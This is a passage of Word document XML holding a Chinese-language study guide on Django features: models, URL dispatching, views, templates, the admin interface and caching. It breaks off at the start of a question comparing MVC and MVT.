          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>代码来描述数据库布局。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">　　每个模型都是继承了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django.db.models.Model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>类的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的类，分别对应数据库中的一个表格。通过建数据库的字段、关系、行为定义为模型类的属性或方法，我们可以使用丰富且灵活的数据库方位</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDF6B17" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>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URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>分配器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1C33BC"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  URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>分配器机制使得</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>信息不再受框架及扩展名的制约，从而让</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>应用的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>设计保持简介。</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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URlconf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>模块中进行描述，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URLconf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>模块中包含使用正则表达式书写的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>函数的映像。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URlconf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>能够以应用为单位进行分割，因此提高了应用的可重复利用性。另外，我们可以利用给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>设置名称并定义的方式让代码和目标直接通过该名称调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，从而将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>设计与代码分离。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F9A019" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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视图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537F88AB"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  Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的视图时一类函数，它能够生成指定页面的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象或像</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Http 404</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这样的异常情况，返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求。典型的视图函数的处理流程通常是从请求参数中获取数据，读取模型，热按后根据获取的数据渲染模板。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAADAB1" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="65"/>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模板系统</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B949895"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在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的概念中，模板系统只负责显示，并不是编写逻辑代码的环境。因此</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的模板系统将设计与内容、代码分离开来，是一共功能强、扩展性高、对设计者很友好的模板语言。</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模板基于文本而不是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，因此它不但能生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，还能生成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>E-mail</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>CSV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>等任意文本格式。</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另</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>外，如果使用模板继承功能，子模板只需要将父模板中预留的空位填满即可。我们在编写模板时只需要描述各个模板独有的部分，因此可以省去重复冗余的编码过程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAE75A0" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="66"/>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管理界面</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E371BD"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大多</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>应用在运行过程中，都需要一个专供拥有管理员权限的用户添加、编辑、删除数据的界面，但是实际制作这个界面并不容易。</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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>只需将已经完工的模型添加到管理站点，就能根据模型定义，动态地生成页面。为我们提供一个功能齐全的管理界面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718F27D0" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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缓存系统</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF753B2"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  Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>memcached</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>等缓存后端轻松地缓存数据。比如可以将动态页面的渲染结果缓存下来，等到下次需要时直接读取缓存，从而不必每次都对动态页面进行处理。</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缓存的后端可以从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>memcached</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、数据库、文件系统、本地内存等位置进行选择。缓存对象也支持整个网站、特定的整个视图、部分模板、特定数据等。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="7A529453" w14:textId="2EDD01A3" w:rsidR="00024E97" w:rsidRPr="003A0200" w:rsidRDefault="00024E9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w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>08</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">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简述</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模式和</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MVT</w:t>
      </w:r>
      <w:r w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模式</w:t>
      </w:r>
      <w:r w:rsidR="00AD41B7" w:rsidRPr="003A0200">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D112AFD" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00AD41B7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="192" w:after="192"/>
        <w:jc w:val="center"/>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初级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MVC</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MVT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="Helvetica"/>
          <w:color w:val="A7A7A7"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="宋体" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="021E8428" wp14:editId="67C09B4A">
            <wp:extent cx="6541770" cy="401193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550791" cy="4017519"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
